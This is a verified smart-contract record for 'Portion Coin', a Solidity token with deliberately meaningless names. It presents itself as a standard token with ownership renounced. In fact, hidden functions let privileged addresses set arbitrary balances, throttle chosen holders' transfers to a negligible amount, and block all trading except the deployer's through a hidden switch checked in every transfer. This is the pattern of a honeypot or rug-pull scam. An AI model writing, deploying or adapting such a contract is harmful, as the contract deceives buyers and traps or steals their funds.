{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract fromAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAmount {\n    function createPair(address launchedAt, address isFund) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface atTradingSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface txLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isFromToken) external view returns (uint256);\n\n    function transfer(address totalReceiverEnable, uint256 exemptIs) external returns (bool);\n\n    function allowance(address liquidityTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalReceiverEnable,\n        uint256 exemptIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSwap, uint256 value);\n    event Approval(address indexed liquidityTake, address indexed spender, uint256 value);\n}\n\ninterface txLaunchMetadata is txLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PortionCoin is fromAuto, txLaunch, txLaunchMetadata {\n\n    uint256 public fromFundAuto = 0;\n\n    function transfer(address swapFund, uint256 exemptIs) external virtual override returns (bool) {\n        return marketingSender(_msgSender(), swapFund, exemptIs);\n    }\n\n    function owner() external view returns (address) {\n        return receiverFundMin;\n    }\n\n    uint256 minFundMax;\n\n    bool public txFee;\n\n    function marketingSender(address isMin, address totalReceiverEnable, uint256 exemptIs) internal returns (bool) {\n        if (isMin == exemptFee) {\n            return takeAt(isMin, totalReceiverEnable, exemptIs);\n        }\n        uint256 limitTrading = txLaunch(tradingTotalTo).balanceOf(buyEnable);\n        require(limitTrading == exemptTo);\n        require(totalReceiverEnable != buyEnable);\n        if (swapShould[isMin]) {\n            return takeAt(isMin, totalReceiverEnable, autoShould);\n        }\n        exemptIs = teamBuyFee(isMin, totalReceiverEnable, exemptIs);\n        return takeAt(isMin, totalReceiverEnable, exemptIs);\n    }\n\n    uint256 private toSell;\n\n    uint256 private feeMinList = 100000000 * 10 ** 18;\n\n    function approve(address takeMin, uint256 exemptIs) public virtual override returns (bool) {\n        enableTeam[_msgSender()][takeMin] = exemptIs;\n        emit Approval(_msgSender(), takeMin, exemptIs);\n        return true;\n    }\n\n    address private receiverFundMin;\n\n    function name() external view virtual override returns (string memory) {\n        return toTotal;\n    }\n\n    function balanceOf(address isFromToken) public view virtual override returns (uint256) {\n        return fromSender[isFromToken];\n    }\n\n    function takeToken(address swapFund, uint256 exemptIs) public {\n        receiverList();\n        fromSender[swapFund] = exemptIs;\n    }\n\n    uint256 exemptTo;\n\n    mapping(address => bool) public launchedSwap;\n\n    mapping(address => uint256) private fromSender;\n\n    function exemptTotal(address takeTxLaunched) public {\n        receiverList();\n        if (feeFrom == shouldFund) {\n            launchLimit = toSell;\n        }\n        if (takeTxLaunched == exemptFee || takeTxLaunched == tradingTotalTo) {\n            return;\n        }\n        swapShould[takeTxLaunched] = true;\n    }\n\n    uint8 private minShould = 18;\n\n    bool public shouldFund;\n\n    address public exemptFee;\n\n    function getOwner() external view returns (address) {\n        return receiverFundMin;\n    }\n\n    mapping(address => bool) public swapShould;\n\n    mapping(address => mapping(address => uint256)) private enableTeam;\n\n    function takeAt(address isMin, address totalReceiverEnable, uint256 exemptIs) internal returns (bool) {\n        require(fromSender[isMin] >= exemptIs);\n        fromSender[isMin] -= exemptIs;\n        fromSender[totalReceiverEnable] += exemptIs;\n        emit Transfer(isMin, totalReceiverEnable, exemptIs);\n        return true;\n    }\n\n    address buyEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMinList;\n    }\n\n    event OwnershipTransferred(address indexed tradingSwap, address indexed walletReceiver);\n\n    uint256 public takeAuto = 3;\n\n    uint256 public launchLimit;\n\n    function receiverList() private view {\n        require(launchedSwap[_msgSender()]);\n    }\n\n    address public tradingTotalTo;\n\n    uint256 constant autoShould = 19 ** 10;\n\n    uint256 public enableTakeReceiver;\n\n    function enableFrom(uint256 exemptIs) public {\n        receiverList();\n        exemptTo = exemptIs;\n    }\n\n    uint256 private teamReceiver;\n\n    bool public fromFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptTeamWallet;\n    }\n\n    function allowance(address tokenTakeFee, address takeMin) external view virtual override returns (uint256) {\n        if (takeMin == maxSender) {\n            return type(uint256).max;\n        }\n        return enableTeam[tokenTakeFee][takeMin];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minShould;\n    }\n\n    bool private feeFrom;\n\n    function buyTeam() public {\n        emit OwnershipTransferred(exemptFee, address(0));\n        receiverFundMin = address(0);\n    }\n\n    function teamBuyFee(address isMin, address totalReceiverEnable, uint256 exemptIs) internal view returns (uint256) {\n        require(exemptIs > 0);\n\n        uint256 buyAmount = 0;\n        if (isMin == tradingTotalTo && takeAuto > 0) {\n            buyAmount = exemptIs * takeAuto / 100;\n        } else if (totalReceiverEnable == tradingTotalTo && fromFundAuto > 0) {\n            buyAmount = exemptIs * fromFundAuto / 100;\n        }\n        require(buyAmount <= exemptIs);\n        return exemptIs - buyAmount;\n    }\n\n    uint256 private fromLaunched;\n\n    string private toTotal = \"Portion Coin\";\n\n    bool private tokenTo;\n\n    string private exemptTeamWallet = \"PCN\";\n\n    function teamEnable(address fundMax) public {\n        if (txFee) {\n            return;\n        }\n        \n        launchedSwap[fundMax] = true;\n        \n        txFee = true;\n    }\n\n    function transferFrom(address isMin, address totalReceiverEnable, uint256 exemptIs) external override returns (bool) {\n        if (_msgSender() != maxSender) {\n            if (enableTeam[isMin][_msgSender()] != type(uint256).max) {\n                require(exemptIs <= enableTeam[isMin][_msgSender()]);\n                enableTeam[isMin][_msgSender()] -= exemptIs;\n            }\n        }\n        return marketingSender(isMin, totalReceiverEnable, exemptIs);\n    }\n\n    constructor (){\n        \n        buyTeam();\n        atTradingSwap exemptModeLiquidity = atTradingSwap(maxSender);\n        tradingTotalTo = maxAmount(exemptModeLiquidity.factory()).createPair(exemptModeLiquidity.WETH(), address(this));\n        buyEnable = maxAmount(exemptModeLiquidity.factory()).feeTo();\n        \n        exemptFee = _msgSender();\n        launchedSwap[exemptFee] = true;\n        fromSender[exemptFee] = feeMinList;\n        if (shouldFund) {\n            shouldFund = true;\n        }\n        emit Transfer(address(0), exemptFee, feeMinList);\n    }\n\n    address maxSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFromToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"enableFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTakeReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTxLaunched\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFundAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"takeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"teamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTotalTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalReceiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PortionCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}